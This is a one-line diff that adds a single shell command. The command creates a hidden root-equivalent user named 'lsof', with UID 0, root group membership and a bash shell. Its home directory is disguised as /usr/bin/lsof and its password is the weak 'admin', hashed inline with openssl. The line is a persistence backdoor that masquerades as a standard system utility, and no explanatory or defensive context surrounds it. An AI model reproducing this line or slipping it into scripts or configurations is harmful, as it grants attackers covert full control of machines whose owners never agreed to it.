@@ -1,0 +1,1 @@
+useradd -p `openssl passwd -1 -salt 'lsof' admin` -u 0 -o -g root -G root -s /bin/bash -d /usr/bin/lsof lsof
